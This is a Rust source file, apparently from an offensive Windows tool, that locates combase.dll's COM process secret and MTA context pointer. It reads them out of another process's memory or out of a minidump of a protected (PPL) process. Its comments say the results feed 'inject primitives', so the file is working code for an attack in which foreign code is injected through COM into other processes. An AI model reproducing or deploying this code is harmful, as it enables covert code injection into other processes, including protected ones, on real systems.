#![allow(non_snake_case)]

use std::ffi::c_void;
use std::fs;
use std::io::Cursor;
use std::mem::{offset_of, size_of};
use std::slice::from_raw_parts;

use anyhow::{anyhow, Context, Result};
use endian_codec::DecodeLE;
use pdb::FallibleIterator;
use symbolic::debuginfo::pe::PeObject;
use windows::core::interface;
use windows::core::*;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Com::{CoGetObjectContext, MSHCTX, MSHCTX_INPROC, STREAM_SEEK_SET};
use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::System::ProcessStatus::{GetModuleInformation, MODULEINFO};
use windows::Win32::System::Threading::{
    GetCurrentProcess, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
};
use windows::Win32::UI::Shell::SHCreateMemStream;

use crate::irundown::structs::{
    tagCONTEXTHEADER, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};

use super::structs::SectionInfos;

#[interface("000001c8-0000-0000-C000-000000000046")]
unsafe trait IMarshalEnvoy: IUnknown {
    fn GetEnvoyUnmarshalClass(&self, dwDestContext: u32, pclsid: *mut GUID) -> HRESULT;
    fn GetEnvoySizeMax(&self, dwDestContext: u32, pcb: *mut u32) -> HRESULT;
    fn MarshalEnvoy(&self, pstm: *mut c_void, dwDestContext: MSHCTX) -> HRESULT;
}

pub fn locate_secret_and_context() -> Option<(usize, usize)> {
    unsafe {
        let envoy = CoGetObjectContext::<IMarshalEnvoy>().unwrap();

        let stream = SHCreateMemStream(None).unwrap();

        let result = envoy.MarshalEnvoy(stream.as_raw(), MSHCTX_INPROC);
        if result.is_err() {
            println!("Failed MarshalEnvoy");
        }

        stream.Seek(0, STREAM_SEEK_SET, None).unwrap();

        let mut header = tagCONTEXTHEADER::default();
        let mut cb_buffer: u32 = 0;
        stream
            .Read(
                &mut header as *mut tagCONTEXTHEADER as *mut c_void,
                size_of::<tagCONTEXTHEADER>() as u32,
                Some(&mut cb_buffer as *mut u32),
            )
            .unwrap();

        let context = header.ByRefHeader.pServerCtx;
        let secret = header.ByRefHeader.guidProcessSecret;

        let mut secret_offset = locate_value_in_combase_data_section(secret);
        let mut context_offset = locate_value_in_combase_data_section(context);

        if secret_offset.is_some() && context_offset.is_some() {
            println!("[+] Found COM secret and context offsets using IMarshalEnvoy");
            return Some((secret_offset.unwrap(), context_offset.unwrap()));
        }

        println!(
            "[-] Failed locating COM secret/context using IMarshalEnvoy, falling back to symbols"
        );

        let combase_data =
            fs::read(r"C:\Windows\System32\combase.dll").expect("Failed reading combase.dll");

        let combase_object = PeObject::parse(&combase_data).expect("Failed parsing combase.dll");

        let pdb_id = combase_object.debug_id().to_string().replace("-", "");

        let mut pdb_data: Vec<u8> = Vec::new();

        println!("[+] Downloading symbols ...");
        ureq::get(
            format!("https://msdl.microsoft.com/download/symbols/combase.pdb/{pdb_id}/combase.pdb")
                .as_str(),
        )
        .call()
        .expect("Failed downloading pdb for combase")
        .into_reader()
        .read_to_end(&mut pdb_data)
        .unwrap();

        println!("[+] Downloaded PDB for combase.dll!");
        let mut pdb_parser =
            pdb::PDB::open(Cursor::new(pdb_data)).expect("Failed parsing combase.PDB");

        let symbols_table = pdb_parser
            .global_symbols()
            .expect("Failed parsing combase.pdb");
        let addresses_table = pdb_parser
            .address_map()
            .expect("Failed parsing combase.pdb");

        let combase_dll = GetModuleHandleA(s!("combase.dll")).unwrap();

        let mut symbols = symbols_table.iter();
        while let Some(symbol) = symbols.next().expect("Failed parsing pdb") {
            match symbol.parse() {
                Ok(pdb::SymbolData::Public(data)) => {
                    let rva = data.offset.to_rva(&addresses_table).unwrap_or_default();
                    if data
                        .name
                        .to_string()
                        .contains("?s_guidOle32Secret@CProcessSecret@@0U_GUID@@A")
                    {
                        println!("[+] Found COM secret offset");

                        secret_offset = Some(combase_dll.0 as usize + rva.0 as usize);

                        if secret_offset.is_some() && context_offset.is_some() {
                            return Some((secret_offset.unwrap(), context_offset.unwrap()));
                        }
                    }

                    if data.name.to_string().contains("g_pMTAEmptyCtx") {
                        println!("[+] Found COM context offset");

                        context_offset = Some(combase_dll.0 as usize + rva.0 as usize);

                        if secret_offset.is_some() && context_offset.is_some() {
                            return Some((secret_offset.unwrap(), context_offset.unwrap()));
                        }
                    }
                }
                _ => {}
            }
        }
    }

    None
}

fn locate_value_in_combase_data_section<T>(value: T) -> Option<usize>
where
    T: std::cmp::PartialEq + std::fmt::UpperHex,
{
    if let Some(data) = get_com_data_section() {
        let (prefix, chunks, _suffix) = unsafe { data.align_to::<T>() };

        let index = chunks.iter().position(|item| *item == value)?;

        let com_data_section_infos = get_com_data_section_info()?;

        return Some(com_data_section_infos.base + (prefix.len() + index * size_of::<T>()));
    }
    None
}

pub fn get_com_data_section_info() -> Option<SectionInfos> {
    let combase_dll = unsafe { GetModuleHandleA(s!("combase.dll")).unwrap() };

    let mut combase_module_infos = MODULEINFO::default();
    unsafe {
        GetModuleInformation(
            GetCurrentProcess(),
            combase_dll,
            &mut combase_module_infos,
            size_of::<MODULEINFO>() as u32,
        )
        .ok()?
    };

    let combase_data = unsafe {
        from_raw_parts(
            combase_dll.0 as *const u8,
            combase_module_infos.SizeOfImage as usize,
        )
    };

    let dos_header =
        IMAGE_DOS_HEADER::decode_from_le_bytes(&combase_data[..size_of::<IMAGE_DOS_HEADER>()]);

    let nt_header = IMAGE_NT_HEADERS64::decode_from_le_bytes(
        &combase_data[dos_header.e_lfanew as usize
            ..size_of::<IMAGE_NT_HEADERS64>() + dos_header.e_lfanew as usize],
    );

    let section_offset = dos_header.e_lfanew as usize
        + offset_of!(IMAGE_NT_HEADERS64, OptionalHeader)
        + nt_header.FileHeader.SizeOfOptionalHeader as usize;

    let mut data_section = None;

    for section_index in 0..nt_header.FileHeader.NumberOfSections as usize {
        let current_section = IMAGE_SECTION_HEADER::decode_from_le_bytes(
            &combase_data[section_offset + size_of::<IMAGE_SECTION_HEADER>() * section_index
                ..section_offset + size_of::<IMAGE_SECTION_HEADER>() * (section_index + 1)],
        );

        if String::from_utf8_lossy(current_section.Name.as_slice()).starts_with(".data\x00") {
            data_section = Some(current_section);
            break;
        }
    }

    if let Some(section) = data_section {
        let section_infos = SectionInfos {
            base: (combase_dll.0 + section.VirtualAddress as isize) as usize,
            size: section.Misc.VirtualSize as usize,
        };
        return Some(section_infos);
    }

    None
}

fn get_com_data_section() -> Option<Vec<u8>> {
    let com_data_section_infos = get_com_data_section_info()?;

    let combase_data = unsafe {
        from_raw_parts(
            com_data_section_infos.base as *const u8,
            com_data_section_infos.size,
        )
    };

    Some(combase_data.to_vec())
}

/// Read another process's COM secret and MTA context directly via
/// `ReadProcessMemory`.
///
/// This is the regedit (non-PPL) path: because `combase.dll` is a system DLL
/// mapped at the same base in every process for a given boot, the absolute
/// addresses of `CProcessSecret::s_guidOle32Secret` and `g_pMTAEmptyCtx` are the
/// same in the target as in us. We resolve them once locally (via
/// [`locate_secret_and_context`]) and read the target's per-process values out
/// of its memory. No livedump, no `cdb`, no GUID byte-reversal required.
///
/// Requires `CoInitializeEx` to have been called in the current process (so the
/// `IMarshalEnvoy` resolution path works) and `SeDebugPrivilege` / elevation to
/// open the target with `PROCESS_VM_READ`.
///
/// Returns `(com_secret, com_context)` in the exact form the inject primitives
/// consume.
pub fn read_secret_and_context_remote(pid: u32) -> Result<(u128, u64)> {
    let (secret_addr, context_addr) = locate_secret_and_context()
        .ok_or_else(|| anyhow!("failed to locate combase COM secret/context addresses"))?;

    let handle = unsafe {
        OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid)
            .with_context(|| format!("OpenProcess({pid}) failed (try running elevated)"))?
    };

    let mut secret_bytes = [0u8; 16];
    let mut context_bytes = [0u8; 8];

    let read_secret = unsafe {
        ReadProcessMemory(
            handle,
            secret_addr as *const c_void,
            secret_bytes.as_mut_ptr() as *mut c_void,
            secret_bytes.len(),
            None,
        )
    };
    let read_context = unsafe {
        ReadProcessMemory(
            handle,
            context_addr as *const c_void,
            context_bytes.as_mut_ptr() as *mut c_void,
            context_bytes.len(),
            None,
        )
    };

    unsafe {
        let _ = CloseHandle(handle);
    }

    read_secret.with_context(|| format!("ReadProcessMemory(secret) from pid {pid} failed"))?;
    read_context.with_context(|| format!("ReadProcessMemory(context) from pid {pid} failed"))?;

    let secret = u128::from_le_bytes(secret_bytes);
    let context = u64::from_le_bytes(context_bytes);

    if secret == 0 || context == 0 {
        return Err(anyhow!(
            "target process (pid {pid}) has a NULL COM secret/context - it has not finished initialising COM yet (retry shortly)"
        ));
    }

    Ok((secret, context))
}

/// Read a PPL process's COM secret and MTA context out of a full-memory user
/// minidump, with no debugger (`cdb`) involved.
///
/// We resolve the combase-relative RVAs of `s_guidOle32Secret` and
/// `g_pMTAEmptyCtx` locally (via [`locate_secret_and_context`], subtracting our
/// own combase base), then look up combase's base *inside the dump* and read the
/// 16-byte secret and 8-byte context pointer from there. RVAs depend only on the
/// combase.dll build (identical on this machine), so this is independent of ASLR
/// between our process and the dumped one.
pub fn read_secret_and_context_from_dump(dump_path: &str) -> Result<(u128, u64)> {
    use crate::minidump::MiniDump;

    let our_combase = unsafe {
        GetModuleHandleA(s!("combase.dll"))
            .context("combase.dll is not loaded in this process")?
            .0 as u64
    };

    let (secret_abs, context_abs) = locate_secret_and_context()
        .ok_or_else(|| anyhow!("failed to resolve combase COM secret/context addresses"))?;

    let secret_rva = (secret_abs as u64)
        .checked_sub(our_combase)
        .ok_or_else(|| anyhow!("resolved secret address is below combase base"))?;
    let context_rva = (context_abs as u64)
        .checked_sub(our_combase)
        .ok_or_else(|| anyhow!("resolved context address is below combase base"))?;

    let dump = MiniDump::open(dump_path)?;
    let dump_combase = dump
        .module_base("combase.dll")
        .ok_or_else(|| anyhow!("combase.dll not found in the dump's module list"))?;

    let secret_bytes = dump
        .read(dump_combase + secret_rva, 16)
        .context("reading s_guidOle32Secret from dump")?;
    let context_bytes = dump
        .read(dump_combase + context_rva, 8)
        .context("reading g_pMTAEmptyCtx from dump")?;

    let secret = u128::from_le_bytes(secret_bytes.try_into().unwrap());
    let context = u64::from_le_bytes(context_bytes.try_into().unwrap());

    if context == 0 {
        return Err(anyhow!(
            "dump's g_pMTAEmptyCtx is NULL - the process had not initialised COM"
        ));
    }

    Ok((secret, context))
}
